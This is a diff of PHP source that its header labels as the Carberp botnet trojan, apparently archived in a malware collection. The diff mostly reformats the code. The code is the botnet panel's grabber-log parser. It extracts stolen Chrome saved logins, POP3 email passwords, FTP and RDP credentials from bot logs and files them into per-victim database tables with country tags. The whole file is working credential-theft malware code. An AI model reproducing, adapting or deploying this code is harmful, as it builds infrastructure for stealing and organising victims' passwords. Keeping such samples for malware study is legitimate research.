@@ -1,6 +1,19 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
-if(!function_exists('get_grabber')){	function get_grabber($log){		global $dir, $geoip_ex, $mysqli, $gi, $filters, $task, $fs, $cb;
+if(!function_exists('get_grabber')){
+	function get_grabber($log){
+		global $dir, $geoip_ex, $mysqli, $gi, $filters, $task, $fs, $cb;
 
         preg_match_all('~#BOTSTART#(.*):(.*)#BOTNIP#(.*?)#BOTEND#~isU', $log, $match, PREG_SET_ORDER);
         $log = '';
@@ -8,7 +21,8 @@ if(!function_exists('get_grabber')){	function get_grabber($log){		global $dir,
         $cbp = 0;
         $abp = count($match);
 
-        if($abp > 0){        	foreach($match as $item){
+        if($abp > 0){
+        	foreach($match as $item){
 	        	preg_match_all('~#START#(.*)#NAME#(.*)#END#~isU', $item[3], $mitem, PREG_SET_ORDER);
 
 				if(!empty($item[1])){
@@ -47,9 +61,13 @@ if(!function_exists('get_grabber')){	function get_grabber($log){		global $dir,
 						case 'GoogleChrome':
 	                    	$data = explode("\r\n", $sitem[2]);
 
-	                    	if(count($data) > 0){	                    		foreach($data as $line){	                    			if(!empty($line)){	                    				$ld = explode("@@@", $line);
+	                    	if(count($data) > 0){
+	                    		foreach($data as $line){
+	                    			if(!empty($line)){
+	                    				$ld = explode("@@@", $line);
 
-	                    				if(count($ld) > 1){	                    					$ld[0] = preg_replace('~ \((.*)\)~', '', $ld[0]);
+	                    				if(count($ld) > 1){
+	                    					$ld[0] = preg_replace('~ \((.*)\)~', '', $ld[0]);
 			                				if(stripos($ld[0], 'http://') !== false){
 			                					$port = @parse_url($ld[0], PHP_URL_PORT);
 			                					$host = get_host($ld[0]);
@@ -67,15 +85,21 @@ if(!function_exists('get_grabber')){	function get_grabber($log){		global $dir,
 
 			                				$import = true;
 
-			                				if($import === true){			                					if(isset($filters[$host])){			                						$count = count($ld);
-			                						if($count == 2){			                							$set_data = explode(':', $ld[1]);
-			                						}elseif($count > 2){			                							$set_data = array();
-			                							for($i = 1; $i < count($ld); $i++){			                								$s_data = explode(':', $ld[$i]);
+			                				if($import === true){
+			                					if(isset($filters[$host])){
+			                						$count = count($ld);
+			                						if($count == 2){
+			                							$set_data = explode(':', $ld[1]);
+			                						}elseif($count > 2){
+			                							$set_data = array();
+			                							for($i = 1; $i < count($ld); $i++){
+			                								$s_data = explode(':', $ld[$i]);
 			                								$set_data[$i-1] = $s_data[1];
 			                							}
 			                						}
 
-			                						if(count($set_data) > 0){			                							$c_data = count($set_data);
+			                						if(count($set_data) > 0){
+			                							$c_data = count($set_data);
 			                							$set_data = implode(':', $set_data);
 			                							$mysqli->query("INSERT DELAYED INTO bf_filter_".$filters[$host]['id']." (prefix, uid, country, md5_hash, program, type, post_date, url, fields, data, size) VALUES ('".$prefix."', '".$uid."', '".$country."', '".md5($set_data . $task->type)."', '".$sitem[1]."', '".$task->type."', NOW(), '".urlencode($ld[0])."', '".$c_data."', '".urlencode($set_data)."', '".strlen($set_data)."')");
 
@@ -87,7 +111,10 @@ if(!function_exists('get_grabber')){	function get_grabber($log){		global $dir,
 			                						}
 
 
-			                					}else{			                						if($task->unnecessary != true){			                							if(empty($unnecessary_uniq[$host])){			                								$unnecessary_uniq[$host] = md5($host);
+			                					}else{
+			                						if($task->unnecessary != true){
+			                							if(empty($unnecessary_uniq[$host])){
+			                								$unnecessary_uniq[$host] = md5($host);
 			                								$mysqli->query('INSERT DELAYED INTO bf_filters_unnecessary (host, file, type) VALUES (\''.$host.'\', \''.$unnecessary_uniq[$host].'\', \''.$task->type.'\')');
 			                							}
 			                							file_put_contents($dir['u'][$task->type] . '/' . $unnecessary_uniq[$host], '#BOTSTART#'.$item[1].':'.$item[2].'#BOTNIP#'."\r\n".'#START#'.$sitem[1].'#NAME#'."\r\n".$line."\r\n".'#END#'."\r\n".'#BOTEND#' . "\r\n", FILE_APPEND);
@@ -111,9 +138,12 @@ if(!function_exists('get_grabber')){	function get_grabber($log){		global $dir,
 						case 'POPPeeper':
 						case 'Becky':
 	                    	$data = explode("...\r\n", $sitem[2]);
-	                    	if(count($data) > 0){	                    		foreach($data as $line){	                    			preg_match_all('~Email: (.*)'."\r\n".'~', $line, $email, PREG_SET_ORDER);
+	                    	if(count($data) > 0){
+	                    		foreach($data as $line){
+	                    			preg_match_all('~Email: (.*)'."\r\n".'~', $line, $email, PREG_SET_ORDER);
 	                    			preg_match_all('~Password \(POP3\): (.*)'."\r\n".'~', $line, $pass, PREG_SET_ORDER);
-	                    			if(!empty($email[0][1]) && !empty($pass[0][1])){	                    				$mysqli->query("INSERT DELAYED INTO bf_filter_ep (prefix, uid, country, md5_hash, program, type, post_date, fields, data, size) VALUES ('".$prefix."', '".$uid."', '".$country."', '".md5($email[0][1] . $pass[0][1] . $task->type)."', '".$sitem[1]."', '".$task->type."', NOW(), '2', '".urlencode($email[0][1] . ':' . $pass[0][1])."', '".strlen($email[0][1] . ':' . $pass[0][1])."')");
+	                    			if(!empty($email[0][1]) && !empty($pass[0][1])){
+	                    				$mysqli->query("INSERT DELAYED INTO bf_filter_ep (prefix, uid, country, md5_hash, program, type, post_date, fields, data, size) VALUES ('".$prefix."', '".$uid."', '".$country."', '".md5($email[0][1] . $pass[0][1] . $task->type)."', '".$sitem[1]."', '".$task->type."', NOW(), '2', '".urlencode($email[0][1] . ':' . $pass[0][1])."', '".strlen($email[0][1] . ':' . $pass[0][1])."')");
 	                    			}
 	                    		}
 	                    	}
@@ -187,7 +217,9 @@ if(!function_exists('get_grabber')){	function get_grabber($log){		global $dir,
 	                			foreach($data as $line){
 	                				$ld = parse_url($line);
 	                				//error_log(print_r($ld, true));
-	                				if(count($ld) > 3){	                					if($ld['scheme'] == 'ftp' && !empty($ld['host']) && !empty($ld['user']) && !empty($ld['pass'])){	                						$mysqli->query("INSERT DELAYED INTO bf_filter_ft (prefix, uid, country, md5_hash, program, type, post_date, fields, data, size) VALUES ('".$prefix."', '".$uid."', '".$country."', '".md5($ld['host'] . $ld['user'] . $ld['pass'] . $task->type)."', '".$sitem[1]."', '".$task->type."', NOW(), '3', '".urlencode($ld['host'] . ':' . $ld['user'] . ':' . $ld['pass'])."', '".strlen($ld['host'] . ':' . $ld['user'] . ':' . $ld['pass'])."')");
+	                				if(count($ld) > 3){
+	                					if($ld['scheme'] == 'ftp' && !empty($ld['host']) && !empty($ld['user']) && !empty($ld['pass'])){
+	                						$mysqli->query("INSERT DELAYED INTO bf_filter_ft (prefix, uid, country, md5_hash, program, type, post_date, fields, data, size) VALUES ('".$prefix."', '".$uid."', '".$country."', '".md5($ld['host'] . $ld['user'] . $ld['pass'] . $task->type)."', '".$sitem[1]."', '".$task->type."', NOW(), '3', '".urlencode($ld['host'] . ':' . $ld['user'] . ':' . $ld['pass'])."', '".strlen($ld['host'] . ':' . $ld['user'] . ':' . $ld['pass'])."')");
 	                					}
 	                    			}
 	                			}
@@ -204,7 +236,9 @@ if(!function_exists('get_grabber')){	function get_grabber($log){		global $dir,
 	                			foreach($data as $line){
 	                				$ld = parse_url($line);
 	                				$ld['user'] = str_replace('\\', '/', $ld['user']);
-	                				if(count($ld) > 3){	                					if($ld['scheme'] == 'rdp' && !empty($ld['host']) && !empty($ld['user']) && !empty($ld['pass'])){	                						$mysqli->query("INSERT DELAYED INTO bf_filter_rd (prefix, uid, country, md5_hash, program, type, post_date, fields, data, size) VALUES ('".$prefix."', '".$uid."', '".$country."', '".md5($ld['host'] . $ld['user'] . $ld['pass'] . $task->type)."', '".$sitem[1]."', '".$task->type."', NOW(), '3', '".urlencode($ld['host'] . ':' . $ld['user'] . ':' . $ld['pass'])."', '".strlen($ld['host'] . ':' . $ld['user'] . ':' . $ld['pass'])."')");
+	                				if(count($ld) > 3){
+	                					if($ld['scheme'] == 'rdp' && !empty($ld['host']) && !empty($ld['user']) && !empty($ld['pass'])){
+	                						$mysqli->query("INSERT DELAYED INTO bf_filter_rd (prefix, uid, country, md5_hash, program, type, post_date, fields, data, size) VALUES ('".$prefix."', '".$uid."', '".$country."', '".md5($ld['host'] . $ld['user'] . $ld['pass'] . $task->type)."', '".$sitem[1]."', '".$task->type."', NOW(), '3', '".urlencode($ld['host'] . ':' . $ld['user'] . ':' . $ld['pass'])."', '".strlen($ld['host'] . ':' . $ld['user'] . ':' . $ld['pass'])."')");
 	                					}
 	                    			}
 	                			}
